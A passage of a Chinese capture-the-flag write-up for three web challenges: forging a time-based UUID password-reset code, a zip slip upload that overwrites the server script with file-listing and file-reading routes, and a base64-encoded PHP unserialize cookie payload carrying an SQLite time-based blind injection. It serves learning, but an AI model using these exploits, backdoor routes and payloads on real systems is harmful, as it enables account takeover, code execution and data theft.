        time_hi_version = (timestamp >> 48) & 0x0fff
        clock_seq_low = clock_seq & 0xff
        clock_seq_hi_variant = (clock_seq >> 8) & 0x3f
        return uuid.UUID(fields=(time_low, time_mid, time_hi_version,
                            clock_seq_hi_variant, clock_seq_low, node), version=1)
    time_str = '2021-01-29 15:31:05.621730300'
    timestamp = time2ns(time_str)
    mac = '02:42:AC:11:00:05'
    node = mac2int(mac)
    clock_seq = 14138
    UUID = uuid1(node, clock_seq, timestamp)
    print(UUID)
这里结果是`008aa0d7-6247-11eb-b73a-0242ac110005`
然后访问`/update_password?reset_code=008aa0d7-6247-11eb-b73a-0242ac110005&password=1234`进行重置密码
最后访问`/get_flag?password=1234`获取flag即可
###  全部代码
    import pymysql.cursors
    import pymysql, os, bcrypt, debug
    from flask import Flask, request
    from secret import flag, secret_key, sql_user, sql_password, sql_database, sql_host
    class ORM():
        def __init__(self):
            self.connection = pymysql.connect(host=sql_host, user=sql_user, password=sql_password, db=sql_database, cursorclass=pymysql.cursors.DictCursor)
        def update(self, sql, parameters):
            with self.connection.cursor() as cursor:
              cursor.execute(sql, parameters)
              self.connection.commit()
        def query(self, sql, parameters):
            with self.connection.cursor() as cursor:
              cursor.execute(sql, parameters)
              result = cursor.fetchone()
            return result
        def get_by_name(self, user):
            return self.query('select * from users where username=%s', user)
        def get_by_reset_code(self, reset_code):
            return self.query('select * from users where reset_code=%s', reset_code)
        def set_password(self, user, password):
            password_hash = bcrypt.hashpw(password, bcrypt.gensalt())
            self.update('update users set password=%s where username=%s', (password_hash, user))
        def set_reset_code(self, user):
            self.update('update users set reset_code=uuid() where username=%s', user)
    app = Flask(__name__)
    app.config['DEBUG'] = False
    app.config['SECRET_KEY'] = secret_key
    app.config['USER'] = 'admin'
    @app.route("/get_flag")
    def get_flag():
        user_row = app.config['ORM'].get_by_name(app.config['USER'])
        if bcrypt.checkpw(request.args.get('password','').encode('utf8'), user_row['password'].encode('utf8')):
            return flag
        return "Invalid password for %s!" % app.config['USER']
    @app.route("/update_password")
    def update_password():
        user_row = app.config['ORM'].get_by_reset_code(request.args.get('reset_code',''))
        if user_row:
            app.config['ORM'].set_password(app.config['USER'], request.args.get('password','').encode('utf8'))
            return "Password reset for %s!" % app.config['USER']
        app.config['ORM'].set_reset_code(app.config['USER'])
        return "Invalid reset code for %s!" % app.config['USER']
    @app.route("/statistics") # TODO: remove statistics
    def statistics():
        return debug.statistics()
    @app.route('/')
    def source():
        return "
    %s
    " % open(__file__).read()
    @app.before_first_request
    def before_first():
        app.config['ORM'] = ORM()
        app.config['ORM'].set_password(app.config['USER'], os.urandom(32).hex())
    @app.errorhandler(Exception)
    def error(error):
        return "Something went wrong!"
    if __name__ == "__main__":
        app.run()
## SLIPPERY UPLOAD——Medium
###  考点
  * [zip路径穿越](https://snyk.io/research/zip-slip-vulnerability)
###  描述
Can you abuse the zip upload and extraction service to gain code execution on
the server?
###  题目分析
前面几行进行了Flask的初始化
    from flask import Flask, request
    import zipfile, os
    app = Flask(__name__)
    app.config['SECRET_KEY'] = os.urandom(32)
    app.config['MAX_CONTENT_LENGTH'] = 1 * 1024 * 1024
    app.config['UPLOAD_FOLDER'] = '/tmp/uploads/'
从路由入手
访问主页会得到题目源码
    @app.route('/')
    def source():
        return '
    %s
    ' % open('/app/run.py').read()
向`/zip_upload`上传文件会执行`zip_extract`函数进行解压
这里的上传文件可以用Postman去操作
为了绕过第一个`if`，就让上传的`name`属性是`zarchive`，上传的文件名是`zarchive.zip`
为了绕过第二个`if`，就把上传的文件的`content_type`改为`application/octet-stream`
这样就成功上传了文件，在`zip_extract`函数中实现了对上传文件的解压
    def zip_extract(zarchive):
        with zipfile.ZipFile(zarchive, 'r') as z:
            for i in z.infolist():
                with open(os.path.join(app.config['UPLOAD_FOLDER'], i.filename), 'wb') as f:
                    f.write(z.open(i.filename, 'r').read())
    @app.route('/zip_upload', methods=['POST'])
    def zip_upload():
        try:
            if request.files and 'zarchive' in request.files:
                zarchive = request.files['zarchive']
                if zarchive and '.' in zarchive.filename and zarchive.filename.rsplit('.', 1)[1].lower() == 'zip' and zarchive.content_type == 'application/octet-stream':
                    zpath = os.path.join(app.config['UPLOAD_FOLDER'], '%s.zip' % os.urandom(8).hex())
                    zarchive.save(zpath)
                    zip_extract(zpath)
                    return 'Zip archive uploaded and extracted!'
            return 'Only valid zip archives are acepted!'
        except:
             return 'Error occured during the zip upload process!'
经过一番搜索，发现这里是存在`Zip Slip
Traversal`漏洞，由于没有对zip压缩包里面的filename进行过滤，会导致目录穿越，从而导致文件重写。在本题已经给出了脚本运行目录`/app/run.py`和上传目录`/tmp/uploads/`
    |--app
    | |--run.py
    |--tmp
    | |--uploads
    | | |--zarchive.zip
先用Linux下的zip命令生成一个压缩包`zip hack.zip ../../app/run.py`
这个命令在`ttt`目录下执行，其目录结构如下。这样就会得到一个`hack.zip`
    |--hack
    | |--app
    | | |--run.py
    | | |--ttt
在python
shell中看一下`infolist()`，可以发现它的`filename`属性是`../../app/run.py`，而在本题的`zip_extract`函数中，它直接执行了`f.write(z.open(i.filename,
'r').read())`，根据上面的目录结构，这就会造成`run.py`的重写
    |--app
    | |--run.py
    |--tmp
    | |--uploads
    | | |--zarchive.zip
到这本题思路就很清晰了
在本地复制粘贴run.py，加一点代码。`get_flag_path`用来列举目录，`get_flag`用于读取文件
    @app.route('/flagpath', methods=['GET'])
    def get_flag_path():
        dicpath = request.args.get('path') or '/'
        try:
            dir_list = []
            dirs = os.listdir(dicpath)
            for i in dirs:
                dir_list.append(i)
            return ''.join(dir_list)
        except:
            return 'something error'
    @app.route('/flag', methods=['GET'])
    def get_flag():
        flag_name = request.args.get('flag') or 'run.py'
        try:
            resflag = open(flag_name).read()
            return resflag
        except:
            return 'something error'
在Linux中建立如下目录结构，在`ttt`目录下执行`zip zarchive.zip ../../app/run.py`得到`zarchive.zip`
    |--hack
    | |--app
    | | |--run.py
    | | |--ttt
使用Postman上传这个压缩包
访问`/`发现成功覆盖，然后访问`/flagpath?path=/app`得到flag路径，最后访问`/flag?flag=flag_33cd0604f65815a9375e2da04e1b8610.txt`读取flag
## CEREAL LOGGER——Medium
###  考点
  * PHP反序列化=>sqlite3盲注
###  描述
Using a specially crafted cookie, you can write data to /dev/null. Can you
abuse the write and read the flag?
###  题目分析
首先是一个写入日志的`insert_log`类，里面实现了SQLite3数据库的`insert`操作。
然后获取cookie中`247`字段对应的内容，以`.`分割，后面的部分要弱等于`0`，前面的部分进行base64解码后再进行反序列化，然后写入到`/dev/null`，`/dev/null`是空设备文件，就是不显示任何信息
    pdo = new SQLite3("/tmp/log.db");
              $this->pdo->exec("INSERT INTO log (message) VALUES ('".$this->new_data."');");
          }
      }
      if (isset($_COOKIE["247"]) && explode(".", $_COOKIE["247"])[1].rand(0, 247247247) == "0") {
          file_put_contents("/dev/null", unserialize(base64_decode(explode(".", $_COOKIE["247"])[0])));
      } else {
          echo highlight_file(__FILE__, true);
      }
这里的SQL语句是完全可控的，也就是说这里是可能存在注入的。
请求时把cookie中`247`字段改为`TzoxMDoiaW5zZXJ0X2xvZyI6MTp7czo4OiJuZXdfZGF0YSI7czoxMDg6IjAnKTtzZWxlY3QgMSB3aGVyZSAxPShjYXNlIHdoZW4oc3Vic3RyKHNxbGl0ZV92ZXJzaW9uKCksMSwxKT0nMycpIHRoZW4gcmFuZG9tYmxvYigxMDAwMDAwMDAwKSBlbHNlIDAgZW5kKTstLSI7fQ==.0e`，发现返回502
这个payload内容如下
    O:10:"insert_log":1:{s:8:"new_data";s:108:"0');select 1 where 1=(case when(substr(sqlite_version(),1,1)='3') then randomblob(1000000000) else 0 end);--";}
相当于进行了sqlite时间盲注，由于这是sqlite3所以版本函数必定返回3开头，所以这里where后面必定是True，改成其他字符，返回200
    INSERT INTO log (message) VALUES ('
    0');select 1 where 1=(case when(substr(sqlite_version(),1,1)='3') then randomblob(1000000000) else 0 end);--    ');
由此可以发现，返回502说明正确，返回200说明错误，可以写盲注脚本了